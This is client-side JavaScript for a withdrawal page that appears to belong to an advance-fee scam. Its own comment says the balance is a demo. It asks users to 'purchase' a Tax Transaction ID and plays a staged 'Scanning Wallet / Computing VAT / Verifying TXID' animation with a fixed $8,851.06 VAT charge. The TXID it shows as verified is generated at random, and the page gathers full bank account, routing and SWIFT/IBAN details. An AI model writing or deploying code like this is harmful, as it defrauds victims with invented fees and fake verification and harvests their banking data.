// Withdraw — bank details + tax ID; real auth, demo balance
(function () {
  'use strict';

  const form = document.getElementById('withdrawForm');
  const msg = document.getElementById('message');
  const purchaseTxidBtn = document.getElementById('purchaseTxidBtn');
  const txidPromptModal = document.getElementById('txidPromptModal');
  const txidVerifyButton = document.querySelector('[data-txid-verify]');
  const txidPromptCloseButtons = document.querySelectorAll('[data-txid-close]');
  const txTxnBase = document.getElementById('txTxnBase');
  const txVatDue = document.getElementById('txVatDue');
  const txEngineStatus = document.getElementById('txEngineStatus');
  const txEngineProgress = document.getElementById('txEngineProgress');
  const txEngineTxid = document.getElementById('txEngineTxid');
  const txEngineVat = document.getElementById('txEngineVat');
  const txEngineTotal = document.getElementById('txEngineTotal');
  const txidVerifiedModal = document.getElementById('txidVerifiedModal');
  const verifiedTxidValue = document.getElementById('verifiedTxidValue');
  const closeVerifiedModalBtn = document.getElementById('closeVerifiedModalBtn');
  const balanceHint = document.getElementById('balanceHint');
  let engineTimer = null;
  let latestGeneratedTxid = '';
  let currentBalance = 0;

  const STORAGE_KEY = 'withdrawFlow';

  function formatUSD(value) {
    if (window.money) return money.format(value);
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(Number(value) || 0);
  }

  function makeTxid() {
    const stamp = Date.now().toString(36).toUpperCase();
    const rand = Math.random().toString(36).slice(2, 10).toUpperCase();
    return 'TX-' + stamp + '-' + rand;
  }

  function isValidTxid(value) {
    return /^TX-[A-Z0-9]{6,20}-[A-Z0-9]{6,20}$/.test(value);
  }

  function stopEngineSimulation() {
    if (engineTimer) {
      clearInterval(engineTimer);
      engineTimer = null;
    }
  }

  function runEngineSimulation(baseAmount) {
    const vat = 8851.06;
    const total = baseAmount + vat;
    if (txTxnBase) txTxnBase.textContent = formatUSD(baseAmount);
    if (txVatDue) txVatDue.textContent = formatUSD(vat);
    if (txEngineVat) txEngineVat.textContent = formatUSD(vat);
    if (txEngineTotal) txEngineTotal.textContent = formatUSD(total);
    latestGeneratedTxid = makeTxid();
    if (txEngineTxid) txEngineTxid.textContent = latestGeneratedTxid;

    const phases = [
      { label: 'Initializing', progress: 16 },
      { label: 'Scanning Wallet', progress: 38 },
      { label: 'Computing VAT', progress: 64 },
      { label: 'Verifying TXID', progress: 84 },
      { label: 'Ready for Payment', progress: 100 }
    ];
    let idx = 0;
    if (txEngineStatus && txEngineStatus.lastChild) {
      txEngineStatus.lastChild.nodeValue = phases[0].label;
    }
    if (txEngineProgress) txEngineProgress.style.width = phases[0].progress + '%';

    stopEngineSimulation();
    engineTimer = setInterval(() => {
      idx += 1;
      if (idx >= phases.length) {
        stopEngineSimulation();
        return;
      }
      if (txEngineStatus && txEngineStatus.lastChild) {
        txEngineStatus.lastChild.nodeValue = phases[idx].label;
      }
      if (txEngineProgress) txEngineProgress.style.width = phases[idx].progress + '%';
      if (idx === 3) {
        latestGeneratedTxid = makeTxid();
        if (txEngineTxid) txEngineTxid.textContent = latestGeneratedTxid;
      }
    }, 620);
  }

  function openTxidPrompt() {
    if (!txidPromptModal) return;
    txidPromptModal.classList.add('open');
    txidPromptModal.setAttribute('aria-hidden', 'false');
    const rawAmount = form && form.amount ? Number(form.amount.value) : 0;
    const baseAmount = Number.isFinite(rawAmount) && rawAmount > 0 ? rawAmount : 1000;
    runEngineSimulation(baseAmount);
  }

  function closeTxidPrompt() {
    if (!txidPromptModal) return;
    stopEngineSimulation();
    txidPromptModal.classList.remove('open');
    txidPromptModal.setAttribute('aria-hidden', 'true');
  }

  function showVerifiedTxidPrompt() {
    const verifiedTxid = latestGeneratedTxid || makeTxid();
    latestGeneratedTxid = verifiedTxid;
    if (verifiedTxidValue) verifiedTxidValue.textContent = verifiedTxid;
    if (form && form.txid) form.txid.value = verifiedTxid;
    if (txidVerifiedModal) {
      txidVerifiedModal.classList.add('open');
      txidVerifiedModal.setAttribute('aria-hidden', 'false');
    }
    closeTxidPrompt();
  }

  function closeVerifiedPrompt() {
    if (!txidVerifiedModal) return;
    txidVerifiedModal.classList.remove('open');
    txidVerifiedModal.setAttribute('aria-hidden', 'true');
  }

  if (purchaseTxidBtn) purchaseTxidBtn.addEventListener('click', openTxidPrompt);
  if (txidVerifyButton) txidVerifyButton.addEventListener('click', showVerifiedTxidPrompt);
  if (closeVerifiedModalBtn) closeVerifiedModalBtn.addEventListener('click', closeVerifiedPrompt);
  if (txidVerifiedModal) {
    txidVerifiedModal.addEventListener('click', (ev) => {
      if (ev.target === txidVerifiedModal) closeVerifiedPrompt();
    });
  }
  txidPromptCloseButtons.forEach((button) => {
    button.addEventListener('click', closeTxidPrompt);
  });
  if (txidPromptModal) {
    txidPromptModal.addEventListener('click', (ev) => {
      if (ev.target === txidPromptModal) closeTxidPrompt();
    });
  }

  function show(type, text) {
    if (!msg) return;
    msg.className = 'msg ' + (type === 'success' ? 'success' : 'error');
    msg.textContent = text;
    msg.style.display = 'block';
  }

  async function loadUser() {
    if (!window.auth || !auth.isAuthenticated()) {
      window.location.href = '/login?redirect=/withdraw';
      return;
    }
    try {
      const data = await auth.fetchMe();
      const user = data.user || {};
      currentBalance = Number(user.balance || 0);
      if (form && form.name) {
        form.name.value = user.name || '';
        form.name.readOnly = true;
      }
      if (form && form.email) {
        form.email.value = user.email || '';
        form.email.readOnly = true;
      }
      if (form && form.accountName && !form.accountName.value) {
        form.accountName.value = user.name || '';
      }
      if (balanceHint) {
        balanceHint.textContent = 'Available: ' + formatUSD(currentBalance);
      }
    } catch (e) {
      show('error', 'Could not load account. Sign in again.');
    }
  }

  document.addEventListener('DOMContentLoaded', loadUser);

  if (!form) return;

  form.addEventListener('submit', async (ev) => {
    ev.preventDefault();
    if (msg) msg.style.display = 'none';

    if (!window.auth || !auth.isAuthenticated()) {
      show('error', 'Please sign in first.');
      return;
    }

    const amount = (form.amount && form.amount.value || '').trim();
    const txid = (form.txid && form.txid.value || '').trim().toUpperCase();
    const note = (form.note && form.note.value || '').trim();
    const bankName = (form.bankName && form.bankName.value || '').trim();
    const accountName = (form.accountName && form.accountName.value || '').trim();
    const accountNumber = (form.accountNumber && form.accountNumber.value || '').trim();
    const routingNumber = (form.routingNumber && form.routingNumber.value || '').trim();
    const swiftIban = (form.swiftIban && form.swiftIban.value || '').trim();
    if (form.txid) form.txid.value = txid;

    if (!amount || !txid) {
      show('error', 'Please provide amount and Tax Transaction ID.');
      return;
    }
    if (!isValidTxid(txid)) {
      show('error', 'Enter a valid Tax Transaction ID (example: TX-MNG3ELKJ-UHJBY0I5).');
      return;
    }
    if (!bankName || !accountName || !accountNumber || !routingNumber) {
      show('error', 'Please complete all required bank details.');
      return;
    }

    const value = Number(amount);
    if (Number.isNaN(value) || value <= 0) {
      show('error', 'Enter a valid amount greater than 0.');
      return;
    }
    if (value > currentBalance) {
      show('error', 'Insufficient balance.');
      return;
    }

    const user = (window.auth && auth.getUser && auth.getUser()) || {};
    const bank = {
      bankName,
      accountName,
      accountNumber,
      routingNumber,
      swiftIban: swiftIban || null
    };

    const btn = form.querySelector('button[type="submit"]');
    if (btn) {
      btn.disabled = true;
      btn.textContent = 'Processing...';
    }

    try {
      const res = await auth.apiRequest('/api/withdraw', {
        method: 'POST',
        body: JSON.stringify({
          amount: value,
          txid,
          note,
          bank
        })
      });
      const data = await res.json().catch(() => ({}));

      if (!res.ok) {
        show('error', (data && data.error) || 'Withdrawal failed');
        return;
      }

      const txId = data.tx && data.tx.id ? data.tx.id : 'tx-' + Date.now();
      const flow = {
        tx: txId,
        amount: value,
        taxId: txid,
        bank,
        email: user.email || form.email.value,
        name: user.name || form.name.value,
        authorized: false,
        note: note || null,
        createdAt: new Date().toISOString()
      };
      try {
        sessionStorage.setItem(STORAGE_KEY, JSON.stringify(flow));
      } catch (e) { /* ignore */ }

      show('success', 'Withdrawal submitted. Processing…');
      const q = [
        'tx=' + encodeURIComponent(txId),
        'amount=' + encodeURIComponent(value),
        'taxId=' + encodeURIComponent(txid)
      ].join('&');
      setTimeout(() => {
        window.location = '/withdraw-processing?' + q;
      }, 700);
    } catch (err) {
      show('error', err.message || 'Network error.');
    } finally {
      if (btn) {
        btn.disabled = false;
        btn.textContent = 'Withdraw';
      }
    }
  });
})();
